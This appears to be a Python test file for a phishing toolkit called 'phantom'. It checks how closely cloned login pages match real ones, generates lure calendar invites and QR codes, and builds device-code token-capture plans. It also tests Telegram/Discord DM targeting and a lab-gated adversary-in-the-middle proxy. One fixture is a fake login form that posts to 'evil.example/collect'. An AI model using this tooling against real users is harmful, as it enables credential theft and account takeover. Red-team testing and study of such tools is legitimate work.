"""Phase 3 completion: clone quality, no-link lures, lab-only AiTM, DM-first."""
from __future__ import annotations

from urllib.parse import quote

from phantom.automation.social import kits
from phantom.automation.social.clone_check import check_clone
from phantom.automation.social.no_link import (
    calendar_invite,
    choose_channel,
    device_code_plan,
    qr_payload,
)

REAL = """<html lang="en"><head><title>Sign in to Acme</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
</head><body><h1>Acme account</h1>
<form action="/login" method="post">
<input type="email" name="user"><input type="password" name="passwd">
</form><img src="/static/logo.png" alt="Acme"></body></html>"""

GOOD_CLONE = """<html lang="en"><head><title>Sign in to Acme</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
</head><body><h1>Acme account</h1>
<form action="/login" method="post">
<input type="email" name="user"><input type="password" name="passwd">
</form><img src="/static/logo.png" alt="Acme"></body></html>"""

BAD_CLONE = """<html><head><title>Welcome</title></head><body>
<form action="https://evil.example/collect" method="post">
<input type="text" name="q"></form></body></html>"""


def test_a_clone_that_differs_is_named_with_its_tells():
    report = check_clone(REAL, BAD_CLONE, real_url="https://acme.example/login",
                         clone_url="http://clone.example/login")
    assert report.blocking is True
    codes = set(report.codes())
    assert {"no_tls", "missing_password_field"} <= codes
    assert {"title_mismatch", "form_action_mismatch",
            "form_action_external", "no_assets", "no_viewport"} & codes
    assert report.marker().startswith("CLONE_CHECK: ")


def test_a_faithful_clone_is_ready():
    report = check_clone(REAL, GOOD_CLONE,
                         real_url="https://acme.example/login",
                         clone_url="https://acme.example/login")
    assert report.ready is True
    assert report.blocking is False
    assert report.score >= 60


def test_the_kit_preflight_is_report_only_unless_strict():
    loose = kits.prelaunch_check("youtube", REAL, BAD_CLONE, strict=False)
    assert loose["blocked"] is False
    assert loose["ok"] is True
    assert loose["blocking"] is True
    strict = kits.prelaunch_check("youtube", REAL, BAD_CLONE, strict=True)
    assert strict["blocked"] is True
    assert strict["ok"] is False
    assert strict["marker"].startswith("CLONE_CHECK: ")


def test_calendar_invite_is_a_valid_ics_with_the_lure_url():
    invite = calendar_invite(
        "Security check", "20260101T100000Z", "20260101T103000Z",
        organizer="it@acme.example", attendee="mario@acme.example",
        url="https://acme.example/verify", description="Conferma l'accesso")
    ics = invite["ics"]
    assert ics.startswith("BEGIN:VCALENDAR\r\n")
    assert ics.endswith("END:VCALENDAR\r\n")
    for line in ("VERSION:2.0", "BEGIN:VEVENT", "UID:", "DTSTAMP:",
                 "DTSTART:20260101T100000Z", "DTEND:20260101T103000Z",
                 "SUMMARY:Security check", "URL:https://acme.example/verify",
                 "END:VEVENT"):
        assert line in ics, line
    assert invite["network"] is False


def test_qr_payload_encodes_the_url_without_a_request():
    url = "https://acme.example/a?b=1&c=2"
    qr = qr_payload(url)
    assert qr["data"] == url
    assert quote(url, safe="") in qr["image_url"]
    assert qr["network"] is False
    assert "qrencode" in qr["offline_command"]


def test_device_code_is_a_plan_not_a_request():
    plan = device_code_plan("microsoft", app_name="Acme Verify")
    assert plan["kind"] == "device_code"
    assert plan["device_login_url"] == "https://microsoft.com/devicelogin"
    assert len(plan["steps"]) >= 4
    assert "token" in plan["captures"].lower()
    assert plan["network"] is False
    assert "consent" in plan


def test_dm_first_only_for_a_person_with_a_transport():
    dm = choose_channel("@mario", dm_transport=True)
    assert dm.channel == "dm" and dm.rerouted is True
    assert dm.marker().startswith("CHANNEL: ")
    # an email target is not a person: the email path is unchanged
    email = choose_channel("mario@acme.it", dm_transport=True)
    assert email.channel == "email" and email.rerouted is False
    # no transport -> email, and the reason says why
    no_transport = choose_channel("@mario", dm_transport=False)
    assert no_transport.channel == "email"
    assert "no_dm_transport" in no_transport.reason


def test_an_explicit_email_campaign_is_never_rerouted():
    decision = choose_channel("@mario", explicit_email=True,
                              dm_transport=True)
    assert decision.channel == "email"
    assert decision.rerouted is False
    assert decision.reason == "explicit_email"


def test_craft_channel_uses_the_configured_transport(monkeypatch):
    from phantom.modules import craft
    monkeypatch.delenv("PHANTOM_DISCORD_WEBHOOK", raising=False)
    monkeypatch.setenv("PHANTOM_TELEGRAM_BOT_TOKEN", "test-token")
    out = craft.craft_channel("@mario")
    assert out["channel"] == "dm"
    explicit = craft.craft_channel("@mario", explicit_email=True)
    assert explicit["channel"] == "email"
    assert explicit["rerouted"] is False


def test_aitm_lab_profile_is_the_only_default_and_is_marked():
    from unittest.mock import patch
    from phantom.modules import craft

    class FakeServer:
        def register_aitm(self, code, upstream):
            self.code, self.upstream = code, upstream

    with patch("phantom.automation.social.aitm.enabled", return_value=True), \
            patch("phantom.automation.social.aitm.lab_profile",
                  return_value=True), \
            patch("phantom.automation.social.aitm.explicitly_enabled",
                  return_value=False), \
            patch.object(craft, "_server", return_value=FakeServer()), \
            patch.object(craft, "_tracking_base",
                         return_value="https://t.example.com"):
        out = craft.craft_aitm("https://login.example.com/")
    assert "error" not in out, out
    assert out["lab"] is True
    assert out["marker"].startswith("AITM_LAB: ")


def test_aitm_stays_off_in_real_mode():
    from unittest.mock import patch
    from phantom.modules import craft

    with patch("phantom.automation.social.aitm.enabled", return_value=False), \
            patch("phantom.automation.social.aitm.lab_profile",
                  return_value=False), \
            patch("phantom.automation.social.aitm.explicitly_enabled",
                  return_value=False):
        out = craft.craft_aitm("https://login.example.com/")
    assert "error" in out
    assert "lab_profile" in out["hint"]
    assert "lab" not in out


def test_craft_no_link_exposes_the_helpers():
    from phantom.modules import craft
    out = craft.craft_no_link("calendar", subject="Check",
                              start="20260101T100000Z",
                              end="20260101T103000Z",
                              url="https://acme.example/x")
    assert out["kind"] == "calendar_invite"
    assert "BEGIN:VCALENDAR" in out["ics"]
